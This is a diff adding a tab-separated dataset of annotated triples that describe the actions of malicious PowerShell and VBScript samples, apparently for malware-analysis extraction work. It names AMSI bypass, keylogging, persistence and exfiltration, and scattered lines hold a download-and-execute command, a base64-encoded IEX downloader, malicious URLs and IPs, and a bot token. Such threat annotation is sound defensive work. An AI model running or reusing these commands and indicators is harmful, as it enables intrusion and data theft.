@@ -1,0 +1,3140 @@
+The script	SUB	Access	C:\ProgramData\WKDXIRNNHFHKNAFGOARGSL\	PATH
+The script	SUB	Retrieve	public IP address	IP ADDRESS
+The script	SUB	Create	KeyLogger function	WAPI
+the script	SUB	Collect	data from clipboard	PVI
+The script	SUB	Have	shellcode	EXE
+CodeDom function	FUNCTION	Decode	long byte sequence	OBF
+The script	SUB	Decode	Base64 encoded string	OBF
+The script	SUB	Download	6317a573893bde4aeea7e18e	FILE
+data	DATA	Saved	C:\ProgramData\	ProgramDataPATH
+The script	SUB	Execute	Compress-Archive	COMMAND
+screenshots	PVI	Wait	15 seconds	TIME
+oil.exe	EXE	SavedTo	C:\oil.exe	PATH
+batch script	EXE	Execute	PowerShell script	EXE
+$YHYA	OBF	Have	Base64 Encoded Payload	OBF
+PowerShell script (Nothing.ps1)	EXE	Execute	a decoded byte sequence	DATA
+The script	SUB	Execute	a web quest	WEB QUEST
+$AA	FILE	WITH NAME	random name	RANDOM FILE NAME
+$AA	FILE	Combined with	$BB	FILE
+The script	SUB	Copy	$MHilluFsD	MEMORY
+mezzanines.dll	DLL	Have	rundll32	WAPI
+The script	SUB	Have	Base64 encoded payload	OBF
+base64 encoded string	OBF	DecodedTo	obfuscated code	CODE
+The script	SUB	Terminate	processes with 'config.json' in path	PROCESS
+The script	SUB	Monitor	C:\Users	PATH
+The script	SUB	Terminate	winword process	PROCESS
+The script	SUB	Use	VirtualAlloc	WAPI
+binary strings	BINARY STRING	ConvertedTo	ASCII	ASCII STRING
+The script	SUB	Use	Receive-Job	COMMAND
+The script	SUB	Use	New-Object	WAPI
+files from MEMEMAN directory	FILE	CopiedTo	user's startup folder	PATH
+[ab821408b424418fa94bb4d815b4e.ad0682a943e4859ef35309cc0a537]	NAMESPACE	Have	a1f5abfa214411baa77e25f6ceaa6	FUNCTION
+The script	SUB	Send	clipboard content	PVI
+Script	SUB	Use	PowerShell remoting functions	FUNCTION
+The script	SUB	Create	VBScript file	EXE
+The script	SUB	Use	Start-Job -RunAs32	Start-Job COMMAND
+Start-Job -RunAs32	Start-Job COMMAND	Have	-RunAs32	RunAs32 PARAMETER
+GetEhvzt	PARAMETER	Replaced With	GetEnvironmentVariable('public')	FUNCTION
+The script	SUB	Collect	User's location	PVI
+The script	SUB	Access	collected key presses	PVI
+The script	SUB	Wait	specified duration ($RunTimeP minutes)	TIME
+The script	SUB	Decode	base64 encoded string	OBF
+byte array `$JTlRGFdlQ`	OBF	Encrypt	x86 assembly instructions	ASM
+The script	SUB	Use	Obfuscated Code	OBF
+The script	SUB	Connect	ammuuuServerHHHHHHHHHHHHHHHHHHHHHtxt	EXTERNAL SERVICE
+a suspicious user agent	USER AGENT	AddedTo	Header of the web quest	WEB QUEST
+The script	SUB	Have	Base64 Encoded Command	OBF
+InstallUtil.exe	EXE	Have	Byte Array	BYTE ARRAY PAYLOAD
+The script	SUB	Create	dynamic assemblies	ASSEMBLY
+The script	SUB	Extract	file.zip	COMPRESSED FILE
+Invoke-Expression	COMMAND	Have	long byte sequence	OBF
+arguments	PARAMETER	ReferTo	msbuild.exe	EXE
+The script	SUB	Check	'adobe' directory	PATH
+powershell.exe -eC	PS COMMAND	Have	-WindowStyle Hidden	BYPASS PARAMETER
+The script	SUB	Connect	C&C server	EXTERNAL SERVICE
+scheduled task 'det'	TASK	Terminated	The script	SUB
+The script	SUB	Create	XX.vbs	EXE
+The script	SUB	Creates	batch file	EXE
+VsLabsData.ps1	EXE	Download	payload	OBF
+The script	SUB	Use	Marshal.Copy	Marshal.Copy
+The script	SUB	Hide	winhost.exe	EXE
+System.Net.WebClient	CLASS	Download	'main.php'	FILE
+The script	SUB	Download	a base64 encoded PowerShell script	EXE
+The script	SUB	Delete	$Path	PATH
+VBScript files	EXE	Hosted	directory in user's AppData\Roaming\Logs folder	USER APPDATA PATH
+VBS script	EXE	Execute	batch script	EXE
+The script	SUB	Create	Report.ps1	EXE
+The script	SUB	Use	PowerShell Encryption	Encryption
+The script	SUB	Create	scheduled task 'TvMusic2'	TASK
+The script	SUB	Use	GetProcAddress	WAPI
+Base64 Encoded Data	OBF	Decoded	decrypted data	DATA
+$NA + $AC	VAR	Is	C:\Windows\System32	PATH
+The script	SUB	Execute	winhost.exe	EXE
+'YWGCNHBTTYGDVSHYYNDAIO.bat'	EXE	Execute	'YWGCNHBTTYGDVSHYYNDAIO.ps1'	EXE
+1.bat	FILE	Execute	PowerShell	EXE
+Powershell	PS COMMAND	Have	command in hidden mode	BYPASS PARAMETER
+The script	SUB	Download	http://jbb123.webd.pro/gg/shove.ke	EXE
+$env:TMP\BrowserData.txt	FILE	Saved	temporary directory	TEMP PATH
+The script	SUB	Connect	htljan62024.blogspot.com	URL
+The script	SUB	Modify	Windows registry	REGKEY
+CreateThread	WAPI	CalledWith	dwCreationFlags: 0	dwCreationFlags PARAMETER
+The script	SUB	Check	size of IntPtr	POINTER SIZE
+main.php	FILE	Hosted	http://mopuketo.space/222g100/main.php	URL
+TvMusic.vbs	EXE	Hosted	public directory	PATH
+Script's keylogger functionality	COMMAND	Collect	clipboard data	PVI
+The script	SUB	Have	-ep bypass	BYPASS PARAMETER
+The script	SUB	Create	shortcut	FILE SHORTCUT
+Loader.vbs	EXE	Create	Loader.bat	EXE
+The script	SUB	Download	http://85.192.63.184/s.exe	EXE
+Batch File	FILE	Execute	PowerShell command	EXE
+System information	PVI	Include	Passwords from popular browsers	PVI
+The script	SUB	Create	VBScript	EXE
+The script	SUB	Have	Obfuscated PowerShell and VBScript code	OBF EXE
+The script	SUB	Collect	specific file types	FILE
+The script	SUB	Wait	7 seconds	TIME
+The script	SUB	Download	a file	FILE
+The script	SUB	Write	multiple files (.ps1, .bat, .vbs)	EXE
+The script	SUB	Define	GPA	FUNCTION
+s.exe	EXE	Hosted	http://85.192.63.184/s.exe	URL
+The script	SUB	Delete	temporary directory	TEMP PATH
+The script	SUB	Download	https://files.catbox.moe/mea71o.apk	EXE
+The script	SUB	Change	Scan Schedule to 8th Day of the Month	SCAN SCHEDULE
+kernel32.dll	LIBRARY	Have	VirtualAlloc	WAPI
+kernel32.dll	LIBRARY	Have	GetProcAddress	WAPI
+a long base64 string	OBF	Have	malicious code	CODE
+The script	SUB	Collect	user's domain	PVI
+The script	SUB	Have	14f30f27-650c00d7-fef40df7	HTTPHEADER
+shortcut in AppData folder	FILE SHORTCUT	Points To	randomly generated file	FILE
+The script	SUB	Create	Shell.Application	EXE
+The script	SUB	Add Exclusion	.exe	EXE
+ASCII-encoded strings	DATA	Decode	commands	COMMAND
+The script	SUB	Have	Base64 Encoded Data	OBF
+The script	SUB	Execute	VirtualAlloc	WAPI
+Base64 encoded payload	OBF	Decoded	byte array	DATA
+The script	SUB	Have	infinite loop (`while (1){...}`)	LOOP
+file.exe	EXE	Saved	the temporary folder	TEMP PATH
+VirtualAlloc	WAPI	Have	flAllocationType: 0x3000	ALLOCATIONTYPE PARAMETER
+scheduled task 'chrome_elf'	TASK	Execute	sqmapi.vbs	EXE
+custom function	FUNCTION	Execute	System.Reflection.Assembly	System.Reflection.Assembly WAPI
+the Black method	FUNCTION	Execute	RegAsm.exe	EXE
+PasswordVault class	WAPI	Access	stored passwords	PVI
+The script	SUB	Retrieve	domain name	DOMAIN NAME
+VBScript	EXE	Saved	startup folder	PATH
+scheduled task 'TvMusic2'	TASK	Execute	every 2 minutes	FREQUENCY
+InfoKey	FUNCTION	Collect	Keylogging	PVI
+The script	SUB	Create	xrbnzmj.ps1	EXE
+PDF.vbs	FILE	Execute	1.bat	EXE
+The script	SUB	Execute	IWR -UseBasicParsing	IWR COMMAND
+GetObject method	FUNCTION	Access	file from suspicious string	DATA
+The script	SUB	Creates	C:\ProgramData\Document\x.ps1	EXE
+JZKPPKGTHBOIPSRKOCOKSH.vbs	EXE	Create	RUCXFGHJUCVOFVUZVIPNCG.ps1	PS COMMAND
+RUCXFGHJUCVOFVUZVIPNCG.ps1	PS COMMAND	Have Name	random string	RANDOM STRING
+1.bat	EXE	Have	POWERSHELL -NOP -WIND HIDDEN -eXEC	PS COMMAND
+POWERSHELL -NOP -WIND HIDDEN -eXEC	PS COMMAND	Have	-NOP -WIND HIDDEN -eXEC	BYPASS PARAMETER
+The script	SUB	Execute	encoded string	DATA
+The script	SUB	Read	'readme.txt'	FILE
+The script	SUB	Define	getit	FUNCTION
+The script	SUB	Disable	event provider for PowerShell tracing	DEFENDER
+The script	SUB	Download	r.exe	EXE
+The script	SUB	Download	CorSym.ps1	EXE
+CodeDom function	FUNCTION	Use	System.CodeDom.Compiler	NAMESPACE
+The script	SUB	Create	text file	FILE
+$oven	VAR	Is	Base64 encoded string	OBF
+msi.dll	DLL	Have	A scanner function	FUNCTION
+Multiple files	FILE	Saved	ProgramData folder	ProgramData PATH
+Chat ID	PARAMETER	Have	-1002168553106	STRING
+The script	SUB	Execute	.NET compiler (aspnet_compiler.exe)	EXE
+The script	SUB	Have	string obfuscation	OBF
+u.exe	EXE	Saved	c:\windows\inf	PATH
+PowerShell execution policies	PS COMMAND	Include	-Ep bypass	BYPASS PARAMETER
+The script	SUB	Have	-NoProfile	BYPASS PARAMETER
+The script	SUB	Define	C# class	Class
+The script	SUB	Have	$XOFWKIVDXBZSKRBOPXCOYL	OBF
+scheduled task 'TvMusic2'	TASK	Start	January 1, 2023	DATE
+The script	SUB	Have	obfuscated code	OBF
+The script	SUB	Connect	http://185.244.20.38	URL
+func_get_delegate_type	FUNCTION	Create	delegate type	DELEGATE
+decrypted byte sequence	DATA	CopiedTo	allocated memory	MEMORY
+The script	SUB	Download	RegSvcs.exe	EXE
+The script	SUB	Connect	remote server	ACTION
+The script	SUB	Create	'runner.exe'	EXE
+The script	SUB	Use	Base64 Encoding and Obfuscation	OBF
+The script	SUB	Execute	Start-Sleep 1000	SLEEP
+byte array	DATA	Saved	XX.PS1	EXE
+The script	SUB	Obfuscate	string manipulation (-replace '', '')	OBF
+The script	SUB	Disable	Script Scanning	DEFENDER
+PowerShell command	PS COMMAND	Have	base64 encoded string	PAYLOAD
+g.exe	EXE	Saved	c:\windows\help	PATH
+VBScript file	EXE	Execute	PowerShell command	EXE
+The script	SUB	Download	'adobe.zip'	COMPRESSED FILE
+The script	SUB	Collect	Session information	PVI
+The script	SUB	Delete	PowerShell-related files	EXE
+The script	SUB	Have	long byte sequences	OBF
+The script	SUB	Create	'microsoft' file	FILE
+The script	SUB	Have	Obfuscated Code	OBF
+The script	SUB	Execute	1.bat	EXE
+The script	SUB	Check	Virtual machine environments	Virtual machine environment
+scheduled task 'TvMusic2'	TASK	Run	TvMusic.vbs	EXE
+IEX expression	COMMAND	Execute	decoded Base64 string	DATA
+The script	SUB	Have	obfuscated code	OBF EXE
+Invoke-WebRequest	COMMAND	Have	-Uri	URL
+VirtualAlloc	WAPI	Create	Memory Space	MEMORY
+The script	SUB	Run	in a non-interactive mode	NON-INTERACTIVE MODE
+The script	SUB	Compute	MD5 Haveh of BIOS serial number	OBF
+new thread	THREAD	Execute	x86 assembly code	ASM
+The script	SUB	Connect	Telegram bot	EXTERNAL SERVICE
+Invoke-WebRequest	COMMAND	Have	-UseBasicParsing	UseBasicParsing PARAMETER
+The script	SUB	Execute	files from an unknown URL	EXE
+files from an unknown URL	EXE	Hosted	an unknown URL	URL
+Invoke-Expression	COMMAND	Have	Base64 Encoded Payload	OBF PAYLOAD
+The script	SUB	Collect	region	PVI
+the thread created by CreateThread	THREAD	Load	shellcode	CODE
+The script	SUB	Decode	Base64 Encoded Data	OBF
+Report.ps1	EXE	Decode	hexadecimal strings	OBF
+VirtualAlloc	WAPI	Create	executable memory	MEMORY
+directory in C:\ProgramData\WD	ProgramDATA PATH	Have	XX.bat	EXE
+encoded data	OBF	DECOMPRESSED	data	data
+The script	SUB	Obfuscate	vgit function	CODE
+go function	FUNCTION	Decode	hexadecimal string	OBF
+The script	SUB	Load	assembly (DLL)	assembly DLL
+The script	SUB	Execute	x.ps1	EXE
+The script	SUB	Create	VBScript coinmarketcap.vbs	EXE
+The script	SUB	Have	obfuscated strings	OBF
+The script	SUB	Sleep	1	TIME
+The script	SUB	Use	Encryption and Decryption functions	Encryption/Decryption FUNCTION
+C:\ProgramData\YWGCNHBTTYGDVSHYYNDAIO	ProgramData PATH	Hosted	YWGCNHBTTYGDVSHYYNDAIO.vbs	EXE
+The script	SUB	Use	delegate for memory address	DELEGATE
+The script	SUB	Encrypt	payloads in Report.ps1	OBF
+Invoke-Expression	COMMAND	Have	IEX	PARAMETER
+The script	SUB	Write	ETC.vbs	EXE
+Win32VirtualAlloc function	WAPI	Allocate	memory	MEMORY
+Generated PowerShell script	PS COMMAND	Have	-Exec Bypass	BYPASS PARAMETER
+PowerShell	EXE	Have	-ExecutionPolicy	Bypass PARAMETER
+The script	SUB	Rename	NSudo.exe	EXE
+scheduled task	TASK	Execute	VBScript file at C:\Users\Public\Smart.vbs	EXE
+The script	SUB	Have	$VPUCVZHVUGVJLCHaveROBTT	OBF
+Add.bat	EXE	Execute	PowerShell script	EXE
+ROBOCOPY	COMMAND	Access	Documents folder and subdirectories	RECURRENT PATH
+The script	SUB	Create	scheduled task 'Express'	TASK
+The script	SUB	Connect	\\posters-dial.com@9809\DavWWWRoot	URL
+The script	SUB	Collect	.txt, .jpg, .env, .jpeg, .doc, .avi, .mp4 files	TEXT IMG FILE
+The script	SUB	Decode	base64 string	OBF
+The script	SUB	Use	bitwise XOR operation	XOR ACTION
+The script	SUB	Access	user's clipboard	PVI
+The script	SUB	Create	log.vbs	EXE
+The script	SUB	Load	dynamic assembly	ASSEMBLY
+PowerShell instance	PS COMMAND	Have	hidden window	BYPASS PARAMETER
+VsLabsData.ps1	EXE	Execute	payload	OBF
+The script	SUB	Have	-win hid	BYPASS PARAMETER
+The script	SUB	Collect	local IP addresses	PVI
+The script	SUB	Create	C:\ProgramData\YWGCNHBTTYGDVSHYYNDAIO	ProgramData PATH
+$YSJXX	OBF	Have	Base64 Encoded Payload	PVI
+The script	SUB	Create	Run.BAT	EXE
+Unusual file paths	PATH	Refer to	C:\Windows\System32	PATH
+$env:computername-Capture.png	FILE	UploadedTo	Dropbox account	EXTERNAL SERVICE
+Add-Type cmdlet	COMMAND	Bypass	script block logging	script block logging ACTION
+The script	SUB	Check	c:\windows\system32\vmtools.dll	FILE
+TrlUqMsx	VALUE	Points to	log-analyzer.exe	EXE
+The script	SUB	Use	mute argument	mute argument
+garold.zip	COMPRESSED FILE	Extract	garold.dll	EXE
+VirtualAlloc	WAPI	Create	executable memory	MEMORY
+The script	SUB	Encrypt	files on the system	FILE
+The script	SUB	Set	registry key HKCU:\Software\Microsoft\Windows\CurrentVersion\Run	AUTORUN REGKEY
+Decoded string	FILE	Have	Series of IP addresses and ports	IP
+VBScript file	EXE	Have	obfuscated strings like 'WSc%.#ll' and 'She', 'ript'	OBF
+The script	SUB	Have	-nop	BYPASS PARAMETER
+The script	SUB	Execute	the downloaded file	EXE
+IEX	COMMAND	Execute	obfuscated string	OBF
+log.vbs	EXE	Saved	C:\ProgramData\log	ProgramData PATH
+System information	PVI	Have	user name	PVI
+The script	SUB	Handle	exceptions	ERR
+The script	SUB	Save	$env:USERPROFILE\AppData\Local\Temp\$env:computername-Capture.png	FILE
+$env:USERPROFILE\AppData\Local\Temp\$env:computername-Capture.png	FILE	Saved	Userprofile\AppData	USER APPDATA PATH
+PDF	FILE	Hosted	http://www.bluiblmaxxlasiblr.com/rh/List%20of%20riblquiribld%20itiblms%20and%20siblrvicibls.pdf	URL
+VirtualAlloc	WAPI	Have	lpAddress: 0	ADDRESS PARAMETER
+The script	SUB	Execute	a file	FILE
+The script	SUB	Use	-win hid	BYPASS PARAMETER
+The script	SUB	Have	System.Windows.Forms	NAMESPACE
+PowerShell script (Nothing.ps1)	EXE	Execute	a method named "Execute"	FUNCTION
+kernel32.dll	DLL	Have	WaitForSingleObject	WAPI
+base64 string	OBF	ConvertedTo	bytes	DATA
+The script	SUB	Decode	$uBdD	OBF
+The script	SUB	Have	$shell	OBF
+The script	SUB	Execute	WindowsBase	CODE
+The script	SUB	Use	function pointer	POINTER
+The script	SUB	Execute	Get-Location	COMMAND
+Get-Location	COMMAND	Collect	Location	PVI
+The script	SUB	Have	comments in multiple languages	Comments in multiple languages
+file.zip	FILE	Hosted	http://flexiblemaria.com/iinkqrwu	URL
+The script	SUB	Execute	netsh	COMMAND
+the script	SUB	Use	catch exceptions	ERR
+key presses	PVI	Include	passwords and sensitive information	PVI
+The script	SUB	Create	Files	FILE
+The script	SUB	Access	user's clipboard	PVI
+encrypted files	FILE	Append	'.psr' extension	EXTENSION
+BT.ps1	EXE	Written	disk	PATH
+The script	SUB	Collect	recovery key	PVI
+The script	SUB	Extract	'adobe.zip'	COMPRESSED FILE
+CreateThread	WAPI	Create	a thread	THREAD
+getit	FUNCTION	Download	PDF file	FILE
+The script	SUB	Execute	Sleep commands	SLEEP
+The script	SUB	Have	encoded command	OBF
+The script	SUB	Allocate	2048 bytes	MEMORY
+The script	SUB	Create	Report.ps1	EXE
+The script	SUB	Define	dischat function	FUNCTION
+The script	SUB	Generate	access token	TOKEN
+NHCIYUEGJZVIPHCJBJRIOD.ps1	EXE	Saved	C:\ProgramData\QPXCNKQPGRJWIWPIQLPDOP	PATH
+VirtualAlloc	WAPI	Create	Memory	MEMORY
+The script	SUB	Create	$env:TEMP\<random_string>.exe	EXE
+.lnk file	FILE SHORCUT	Set	Launch on startup	AUTORUN
+The script	SUB	Execute	decoded byte sequence	BYTE ARRAY PAYLOAD
+The script	SUB	Create	JZKPPKGTHBOIPSRKOCOKSH.bat	EXE
+byte arrays	DATA	Joined	executed payload	DATA
+The script	SUB	Use	Out-File cmdlet	COMMAND
+The script	SUB	Execute	remote code	REMOTE CODE
+delegate	DELEGATE	Execute	IEX	IEX COMMAND
+The script	SUB	Connect	aAB0AHQAcAA6AC8ALwAxADIALgA0ADgALgAxADgANgAuADkAOAA6ADQANAAzAA==	URL
+getit function	FUNCTION	Download	Irs Tax Status.pdf	FILE
+The script	SUB	Use	GetProcAddress	WAPI
+scheduled task	TASK	Execute	C:\ProgramData\QYZZDAOKPZUJIKAFEZWZDV\QYZZDAOKPZUJIKAFEZWZDV.vbs	EXE
+The script	SUB	Have	while (1){...}	LOOP
+The script	SUB	Access	C:\Windows\Mi$!&!!^crosoft.NET\Frame$!&!!^work\v4.0.30319\aspnet_compiler.exe	EXE
+191.232.181.180	IP ADDRESS	Open	Port 443	PORT
+$MHilluFsD	OBF	Decoded	payload	PAYLOAD
+The script	SUB	Modify	amsiInitFailed field	DEFENDER
+The script	SUB	Create	delegate	DELEGATE
+encoded strings	OBF	Decoded	ReturnShellAlosh function	FUNCTION
+The script	SUB	Download	shove.ke	EXE
+The script	SUB	Create	$BB	FILE WITH RANDOM NAME
+Run.BAT	EXE	Hosted	C:\Users\Public\Run\	PATH
+The script	SUB	Disable	Anti-Malware Scan Interface (AMSI)	DEFENDER
+The script	SUB	Execute	unknown code	CODE
+PowerShell command	EXE	Execute	decoded base64 string	OBF PAYLOAD
+marqueesInvariance.txt	FILE	Saved	'C:\users\public'	PATH
+WD.vbs	EXE	Saved	directory in ProgramData	ProgramData PATH
+The script	SUB	Create	C:\ProgramData\MiniTool	ProgramData PATH
+Received commands	COMMAND	Send	remote server	HOST
+func_get_proc_address	FUNCTION	Retrieve	function address in kernel32.dll	MEM_ADDRESS
+system information	PVI	Include	operating system	PVI
+The script	SUB	Execute	cmd.exe	EXE
+The script	SUB	Execute	malicious.exe	EXE
+PowerShell with -ExecutionPolicy Bypass	PS COMMAND	Have	-ExecutionPolicy	Bypass PARAMETER
+script	SUB	Write	TvMusic.vbs	EXE
+The script	SUB	Reference	Microsoft.VisualBasic	VB LIBRARY
+The script	SUB	Use	HH	CLASS
+The script	SUB	Create	new script block	FILE
+The script	SUB	Use	start-sleep	SLEEP
+EPzLaSUIf.bin	EXE	Hosted	http://adnmarketing.ec/robostar.php	URL
+The script	SUB	Use	kernel32.dll	LIBRARY
+PowerShell script	PS COMMAND	Use	System.Windows.Forms	System.Windows.Forms WAPI
+The script	SUB	Create	VBS script	EXE
+scheduled task	TASK	Execute	Pictures.vbs	EXE
+QPXCNKQPGRJWIWPIQLPDOP.vbs	EXE	Saved	C:\ProgramData\QPXCNKQPGRJWIWPIQLPDOP	ProgramData PATH
+The script	SUB	Connect	remote server	REMOTE HOST
+The script	SUB	Create	GTZYVDQNGLKWWAYUCNKYHE.bat	EXE
+kms8.msguides.com	URL	Hosted	public Key Management Service (KMS)	EXTERNAL SERVICE
+The script	SUB	Use	PowerShell Compression	COMPRESSION API
+Microsoft.VisualBasic.Interaction.CallByname	WAPI	Inject	.NET Assembly	NET ASSEMBLY
+The script	SUB	Download	'ngrok.exe'	EXE
+The script	SUB	Use	Base64 Encoding	OBF
+The script	SUB	Use	mutex	MUTEX
+The script	SUB	Execute	start-sleep -Seconds 15	SLEEP
+The script	SUB	Have	-Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AbABvAGcAaQBuAGwAaQBuAGUALgBkAG8AcAAvAGkAbgBkAGUAeAAuAHAAaABwACIAKQA=	OBF PARAMETER
+The script	SUB	Use	HzGaJsAt function	FUNCTION
+XX.vbs	EXE	Saved	directory in ProgramData	PATH	
+The script	SUB	Create	HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run	AUTORUN REGKEY
+bat files	EXE	Hosted	C:\ProgramData\WD	ProgramData PATH	
+data	data	Sent	webhook URL	EXTERNAL SERVICE
+The script	SUB	Drop	vbs files	EXE
+The script	SUB	Send	system information	PVI
+The script	SUB	Write	$env:TMP + '\cpy'	TEMP PATH
+The script	SUB	Check	running as an administrator	running as an administrator	
+The script	SUB	Use	System.Convert.ToInt32	System.Convert.ToInt32 COMMAND
+2.tar.gpg	FILE	Hosted	https://republishnow.com/2.tar.gpg	URL
+PowerShell command	EXE	Download	an executable file	EXE
+The script	SUB	Use	string manipulation	OBF
+The script	SUB	Collect	system uptime	PVI
+PowerShell command	PS COMMAND	Execute	iex	COMMAND
+PasswordVault class	FUNCTION	Collect	stored passwords	PVI
+The script	SUB	Define	byte array $txRbsuvSoU	PAYLOAD PARAMETER
+This script	SUB	Execute	RegSvcs.exe	EXE
+The script	SUB	Collect	GPO/OU data	PVI
+The script	SUB	Access	data from a stream	DATA
+stored passwords	PVI	Saved	C:\Users\Owner\AppData\Local\Temp\tmpE69A.tmp	FILE
+The script	SUB	Create	PowerShell ISE shortcut	EXE SHORTCUT
+The script	SUB	Have	base64-encoded data	OBF
+VBScript file (BT.vbs)	EXE	Execute	PowerShell script (BT.ps1)	EXE
+InvokeWithEvasion	COMMAND	Check	the script in a 32-bit process if the system is 64-bit	CONDITION
+The script	SUB	Terminate	'cmd'	PROCESS
+Report.ps1	EXE	Decode	second byte sequence	OBF
+The script	SUB	Terminate	wscript	PROCESS
+oghygb4	FUNCTION	Use	Base64 Encoding	OBF
+The script	SUB	Create	WD.bat	EXE
+scheduled task	TASK	Execute	every 2 minutes	FREQUENCY
+function D4FD5C5B9266824C4EEFC83E0C69FD3FAA	FUNCTION	Decode	Base64 string	OBF
+Clipboard data	PVI	SentTo	Discord webhook	EXTERNAL SERVICE
+The script	SUB	Create	thukanthukai.~!!@@!!@@!!~	FILE
+executables and DLLs	EXE	Hosted	update-ledger.net	EXTERNAL URL
+The script	SUB	Download	4th.zip	COMPRESSED FILE
+WD.PS1	EXE	Create	XX.PS1	EXE
+screenshots	PVI	SentTo	Dropbox	EXTERNAL SERVICE
+$uZjpAzXjSE	PATH	Have Name	random string	RANDOM STRING
+Start-Sleep	COMMAND	Have	7 seconds	TIME
+The script	SUB	Download	zip file	COMPRESSED FILE
+byte array	DATA	CopiedTo	memory	MEMORY
+The script	SUB	Use	several .NET assemblies	NET ASSEMBLY
+The script	SUB	Execute	Send-MailMessage	Send-MailMessage COMMAND
+The script	SUB	Execute	Infinite Loop	LOOP
+byte array	DATA	CopiedTo	memory location	MEMORY
+The script	SUB	Have	$ATUBRDUAVDPPRNHXEYSCSW	OBF
+The script	SUB	Load	PresentationCore assembly	PresentationCore assembly CODE
+The script	SUB	Delete	result files	FILE
+The script	SUB	Execute	encoded x86 assembly code	x86 assembly CODE
+The script	SUB	Change	registry key	REGKEY
+Microsoft.bat	EXE	Saved	C:\ProgramData\Document	PATH
+The script	SUB	Execute	New-Object Net.WebClient	Net.WebClient COMMAND
+The script	SUB	Connect	192.168.74.100:55555	IP
+the script	SUB	Define	qqgame_tim	FUNCTION
+Bot Token	BOT TOKEN	Have	7484009227:AAEvngzrIKFNFdfSqECzWAqbnB5IXk8pjVo	RANDOM STRING
+The script	SUB	Create	startup entries	REGKEY
+Isass.exe	EXE	Saved	C:\ProgramData\MicrosoftCorporation\Windows\System32\	ProgramData PATH
+'leUafP.dat'	DATA	Hosted	temp folder	TEMP PATH
+IEX	COMMAND	Execute	a downloaded file	FILE
+1.bat	EXE	Execute	PowerShell script	EXE
+The script	SUB	Collect	ARP table data	PVI
+iex	COMMAND	Have	-ExecutionPolicy Bypass	PARAMETER
+The script	SUB	Execute	a base64 encoded string	OBF
+The script	SUB	Create	xx.vbs	EXE
+The script	SUB	Execute	AutoIt3.exe	EXE
+The script	SUB	Create	New.vbs	EXE
+The script	SUB	Have	$e+$r	VAR
+The script	SUB	Execute	PowerShell process	PROCESS
+The script	SUB	Have	Obfuscated Base64 String	OBF
+The script	SUB	Create	$JMdELqYWTpM	OBF
+The script	SUB	Allocate	memory in the process space	MEMORY
+PowerShell command	EXE	Decode	decoded version of the long byte sequence	DATA
+kernel32.dll	LIBRARY	Have	CreateThread	WAPI
+The script	SUB	Detect	Virtual Machine	Virtual Machine
+Base64 Encoded Command	OBF	Have	powershell.exe -c (new-object net.webclient).downloadstring('http://10.0.0.1/share/update.exe') | PS	COMMAND
+powershell.exe -c (new-object net.webclient).downloadstring('http://10.0.0.1/share/update.exe') |	PS COMMAND	Download	http://10.0.0.1/share/update.exe	EXE
+http://10.0.0.1/share/update.exe	EXE	Hosted	http://10.0.0.1	URL
+username	PVI	SentTo	http://51.132.148.124/brume.php	URL
+Report.ps1	EXE	Hosted	user's AppData\Roaming\Logs folder	PATH
+The script	SUB	Have	-W Hidden	BYPASS PARAMETER
+The script	SUB	Create	TBFLVIISWLYQJRIYEDPLGO.ps1	EXE
+The script	SUB	Have	.biden extension	SPECIFIED FILE EXTENSION
+The script	SUB	Use	complex string manipulation	OBF
+The script	SUB	Use	XOR operation	DECRYPTION
+Json files	DATA	SentTo	Discord webhook	WEBHOOK
+The script	SUB	Copy	$GSZDYabcRPKLoT	MEMORY
+alias "zwert"	COMMAND	Have	command "cu$rpkuao"	PAYLOAD
+batch file (JJVXCDAUCHAIHBIEPXDBCS.bat)	EXE	have	elevated privileges	ELEVATED PRIVILEGES
+Rundll32	COMMAND	Have	agreeBrood.jpg	FILE
+The script	SUB	Execute	NHCIYUEGJZVIPHCJBJRIOD.ps1	EXE
+$outputFile	FILE	UploadedTo	$TargetFilePath="/"	PATH
+The script	SUB	Create	libraries.ps1	EXE
+The script	SUB	Download	'POWERSELL'	URL
+The script	SUB	Collect	screenshots	PVI
+4th.zip	COMPRESSED FILE	Hosted	http://navitainer.net/4th.zip	URL
+The script	SUB	Collect	hardware specifications	PVI
+$uBdD	OBF	Have	Base64 Encoding	OBF
+The script	SUB	Use	IEX	COMMAND
+The script	SUB	Use	base64 encoding	OBF
+data	DATA	Extracted	readme.txt	FILE
+The script	SUB	Execute	System.Reflection.Assembly	System.Reflection.Assembly WAPI
+2.tar	COMPRESSED FILE	Decompressed	2.tar.gpg	FILE
+stored passwords	PVI	Write	C:\Users\Owner\AppData\Local\Temp\tmpD994.tmp	TEMP FILE
+The script	SUB	Executes	Payload	EXE
+The script	SUB	Have	Reflection	Reflection
+The script	SUB	Execute	hidden processes	HIDDEN PROCESS
+The script	SUB	Wait	180 seconds	TIME
+The script	SUB	Decode	base64 data	OBF
+The script	SUB	Rename	.sss and .uuu files	FILE
+The script	SUB	Download	DLL from external source	EXE
+Start-Sleep	COMMAND	Wait	7 seconds	TIME
+The script	SUB	Create	client32.exe	EXE
+The script	SUB	Download	c.exe	EXE
+The script	SUB	Use	System.Reflection.Assembly	System.Reflection.Assembly WAPI
+The script	SUB	Have	Obfuscated Strings	OBF
+Decoded string	OBF	Have	Multiple URLs	URL
+start-sleep	COMMAND	Have	7 seconds	SLEEP
+The script	SUB	Create	hidden directory	HIDDEN PATH
+The script	SUB	Execute	item.dat	FILE
+The script	SUB	Change	SmartScreenEnabled to Off	SmartScreenEnabled REGKEY
+Function from System.Management.Automation	FUNCTION	Change	Value of a non-public, static field	NON-PUBLIC FIELD
+The script	SUB	Use	new-object net.webclient	net.webclient COMMAND
+The script	SUB	Download	https://root-head.com/2708.bs64	URL
+Invoke-WebRequest	COMMAND	Download	additional payload	EXE
+WD.PS1	EXE	Have	byte array	DATA
+The script	SUB	Download	http://8.142.44.127:81/image/qianxinn.png	FILE
+The script	SUB	Connect	https://stevemisatih.com/invoice/get.php	URL
+Sexology.~!!!!!!!!!!!!!!!!~	FILE	Hosted	C:\ProgramData\TUKHAMTASSER	ProgramData PATH
+The script	SUB	Have	-exec bypass	BYPASS PARAMETER
+The script	SUB	Have	Decryption Routine	DECRYPTION TOOL
+The script	SUB	Access	URL	URL
+the script	SUB	Execute	Invoke-Expression	COMMAND
+The script	SUB	Create	a scheduled task	TASK
